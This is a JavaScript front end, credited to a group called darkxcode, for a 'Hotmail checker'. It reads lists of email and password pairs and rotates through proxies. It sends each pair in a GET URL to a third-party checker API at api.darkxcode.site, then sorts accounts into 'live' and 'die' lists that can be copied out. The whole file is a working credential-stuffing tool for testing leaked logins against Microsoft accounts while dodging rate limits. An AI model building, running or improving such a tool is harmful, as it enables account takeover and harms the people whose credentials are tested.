/*
   $ TEAM    : https://instagram.com/darkxcode_
   $ AUTHOR  : https://t.me/zlaxtert 
   $ CODE    : https://t.me/zexkings 
   $ DESIGN  : https://t.me/danielsmt 
   $ SITE    : https://darkxcode.site/
   $ VERSION : 1.0
*/


$(document).ready(function() {
    // Set current year
    $('#currentYear').text(new Date().getFullYear());
    
    // Theme toggle
    const themeToggle = $('#themeToggle');
    const body = $('body');
    
    // Check for saved theme preference
    if (localStorage.getItem('darkMode') === 'true') {
        body.addClass('dark-mode');
        themeToggle.html('<i class="fas fa-sun"></i>');
    }
    
    themeToggle.on('click', function() {
        body.toggleClass('dark-mode');
        if (body.hasClass('dark-mode')) {
            themeToggle.html('<i class="fas fa-sun"></i>');
            localStorage.setItem('darkMode', 'true');
        } else {
            themeToggle.html('<i class="fas fa-moon"></i>');
            localStorage.setItem('darkMode', 'false');
        }
    });
    
    // Variables for checking process
    let isChecking = false;
    let accounts = [];
    let proxies = [];
    let currentProxyIndex = 0;
    let liveCount = 0;
    let dieCount = 0;
    let totalAccounts = 0;
    let checkedAccounts = 0;
    let currentRequest = null;
    
    // DOM elements
    const startBtn = $('#startBtn');
    const stopBtn = $('#stopBtn');
    const progressBar = $('#progressBar');
    const progressText = $('#progressText');
    const liveCountEl = $('#liveCount');
    const dieCountEl = $('#dieCount');
    const liveResults = $('#liveResults');
    const dieResults = $('#dieResults');
    
    // Copy buttons
    $('#copyLiveBtn').on('click', function() {
        const text = Array.from($('#liveResults .list-group-item')).map(item => $(item).text()).join('\n');
        copyToClipboard(text);
        showToast('Live results copied to clipboard!', 'success');
    });
    
    $('#copyDieBtn').on('click', function() {
        const text = Array.from($('#dieResults .list-group-item')).map(item => $(item).text()).join('\n');
        copyToClipboard(text);
        showToast('Die results copied to clipboard!', 'success');
    });
    
    // Clear buttons
    $('#clearLiveBtn').on('click', function() {
        liveResults.empty();
        liveCount = 0;
        liveCountEl.text(liveCount);
        showToast('Live results cleared!', 'info');
    });
    
    $('#clearDieBtn').on('click', function() {
        dieResults.empty();
        dieCount = 0;
        dieCountEl.text(dieCount);
        showToast('Die results cleared!', 'info');
    });
    
    // Start checking
    startBtn.on('click', function() {
        const apikey = $('#apikey').val().trim();
        const proxyType = $('#proxyType').val();
        const proxyListText = $('#proxyList').val().trim();
        const proxyAuth = $('#proxyAuth').val().trim();
        const accountListText = $('#accountList').val().trim();
        
        // Validation
        if (!apikey) {
            showToast('API Key is required!', 'error');
            return;
        }
        
        if (!proxyType) {
            showToast('Proxy Type is required!', 'error');
            return;
        }

        
        if (!proxyListText) {
            showToast('Proxy List is required!', 'error');
            return;
        }
        

        if (!accountListText) {
            showToast('Account List is required!', 'error');
            return;
        }
        
        // Parse accounts and proxies
        accounts = parseAccounts(accountListText);
        proxies = parseProxies(proxyListText);
        
        if (accounts.length === 0) {
            showToast('No valid accounts found!', 'error');
            return;
        }

        
        if (proxies.length === 0) {
            showToast('No valid proxies found!', 'error');
            return;
        }
        

        totalAccounts = accounts.length;
        checkedAccounts = 0;
        liveCount = 0;
        dieCount = 0;
        
        // Update UI
        liveCountEl.text(liveCount);
        dieCountEl.text(dieCount);
        progressBar.css('width', '0%').text('0%');
        progressText.text(`0/${totalAccounts}`);
        
        // Start the process
        isChecking = true;
        startBtn.prop('disabled', true);
        stopBtn.prop('disabled', false);
        
        // Start checking accounts
        checkNextAccount(apikey, proxyType, proxyAuth);
    });
    
    // Stop checking
    stopBtn.on('click', function() {
        isChecking = false;
        if (currentRequest) {
            currentRequest.abort();
        }
        startBtn.prop('disabled', false);
        stopBtn.prop('disabled', true);
        showToast('Checking stopped!', 'info');
    });
    
    // Parse account list
    function parseAccounts(text) {
        const lines = text.split('\n');
        const accounts = [];
        
        for (const line of lines) {
            const trimmedLine = line.trim();
            if (!trimmedLine) continue;
            
            let email, password;
            
            if (trimmedLine.includes('|')) {
                [email, password] = trimmedLine.split('|').map(part => part.trim());
            } else if (trimmedLine.includes(':')) {
                [email, password] = trimmedLine.split(':').map(part => part.trim());
            } else {
                continue; // Skip invalid lines
            }
            
            if (email && password) {
                accounts.push({ email, password });
            }
        }
        
        return accounts;
    }
    
    // Parse proxy list
    function parseProxies(text) {
        const lines = text.split('\n');
        const proxies = [];
        
        for (const line of lines) {
            const trimmedLine = line.trim();
            if (!trimmedLine) continue;
            
            if (trimmedLine.includes(':')) {
                proxies.push(trimmedLine);
            }
        }
        
        return proxies;
    }
    
    // Get next proxy (round-robin)
    function getNextProxy() {
        if (proxies.length === 0) return '';
        
        const proxy = proxies[currentProxyIndex];
        currentProxyIndex = (currentProxyIndex + 1) % proxies.length;
        return proxy;
    }
    
    // Check next account
    function checkNextAccount(apikey, proxyType, proxyAuth) {
        if (!isChecking || checkedAccounts >= totalAccounts) {
            // Finished checking all accounts
            isChecking = false;
            startBtn.prop('disabled', false);
            stopBtn.prop('disabled', true);
            showToast('Checking completed!', 'success');
            return;
        }
        
        const account = accounts[checkedAccounts];
        const proxy = getNextProxy();
        
        // Build API URL
        const apiUrl = `https://api.darkxcode.site/checker/hotmail/?list=${account.email}|${account.password}&proxy=${proxy}&proxyAuth=${proxyAuth}&type_proxy=${proxyType}&apikey=${apikey}`;
        
        // Make API request
        currentRequest = $.ajax({
            url: apiUrl,
            method: 'GET',
            timeout: 30000,
            success: function(response) {
                handleResponse(response, account);
            },
            error: function(xhr, status, error) {
                handleError(error, account);
            },
            complete: function() {
                checkedAccounts++;
                updateProgress();
                
                if (isChecking) {
                    // Check next account after a short delay to avoid rate limiting
                    setTimeout(() => checkNextAccount(apikey, proxyType, proxyAuth), 100);
                }
            }
        });
    }
    
    // Handle API response
    function handleResponse(response, account) {
        if (response && response.data) {
            const { status, msg, valid } = response.data;
            
            if (valid === true || msg === 'SUCCESS LOGIN!' || msg === 'Help us secure your account') {
                // Live account
                liveCount++;
                liveCountEl.text(liveCount);
                
                const resultItem = `
                    <li class="list-group-item list-item live-item">
                        <div class="d-flex justify-content-between align-items-center">
                            <div>
                                <span class="status-icon"><i class="fas fa-check-circle text-success"></i></span>
                                <strong>${account.email}</strong> | ${account.password}
                            </div>
                            <span class="badge bg-success">${msg}</span>
                        </div>
                    </li>
                `;
                
                liveResults.prepend(resultItem);
            } else {
                // Die account
                dieCount++;
                dieCountEl.text(dieCount);
                
                const resultItem = `
                    <li class="list-group-item list-item die-item">
                        <div class="d-flex justify-content-between align-items-center">
                            <div>
                                <span class="status-icon"><i class="fas fa-times-circle text-danger"></i></span>
                                <strong>${account.email}</strong> | ${account.password}
                            </div>
                            <span class="badge bg-danger">${msg}</span>
                        </div>
                    </li>
                `;
                
                dieResults.prepend(resultItem);
            }
        } else {
            // Invalid response
            dieCount++;
            dieCountEl.text(dieCount);
            
            const resultItem = `
                <li class="list-group-item list-item die-item">
                    <div class="d-flex justify-content-between align-items-center">
                        <div>
                            <span class="status-icon"><i class="fas fa-times-circle text-danger"></i></span>
                            <strong>${account.email}</strong> | ${account.password}
                        </div>
                        <span class="badge bg-danger">INVALID RESPONSE</span>
                    </div>
                </li>
            `;
            
            dieResults.prepend(resultItem);
        }
    }
    
    // Handle API error
    function handleError(error, account) {
        dieCount++;
        dieCountEl.text(dieCount);
        
        const errorMsg = error || 'Request failed';
        
        const resultItem = `
            <li class="list-group-item list-item die-item">
                <div class="d-flex justify-content-between align-items-center">
                    <div>
                        <span class="status-icon"><i class="fas fa-times-circle text-danger"></i></span>
                        <strong>${account.email}</strong> | ${account.password}
                    </div>
                    <span class="badge bg-danger">${errorMsg}</span>
                </div>
            </li>
        `;
        
        dieResults.prepend(resultItem);
    }
    
    // Update progress bar and text
    function updateProgress() {
        const progress = (checkedAccounts / totalAccounts) * 100;
        progressBar.css('width', `${progress}%`).text(`${progress.toFixed(1)}%`);
        progressText.text(`${checkedAccounts}/${totalAccounts}`);
    }
    
    // Copy text to clipboard
    function copyToClipboard(text) {
        const textarea = document.createElement('textarea');
        textarea.value = text;
        document.body.appendChild(textarea);
        textarea.select();
        document.execCommand('copy');
        document.body.removeChild(textarea);
    }
    
    // Show toast notification
    function showToast(message, type = 'info') {
        // Remove any existing toasts
        $('.toast').remove();
        
        const toast = $(`
            <div class="toast align-items-center text-white bg-${type === 'error' ? 'danger' : type} border-0 position-fixed bottom-0 end-0 m-3" role="alert" aria-live="assertive" aria-atomic="true">
                <div class="d-flex">
                    <div class="toast-body">
                        ${message}
                    </div>
                    <button type="button" class="btn-close btn-close-white me-2 m-auto" data-bs-dismiss="toast" aria-label="Close"></button>
                </div>
            </div>
        `);
        
        $('body').append(toast);
        
        const bsToast = new bootstrap.Toast(toast);
        bsToast.show();
    }
});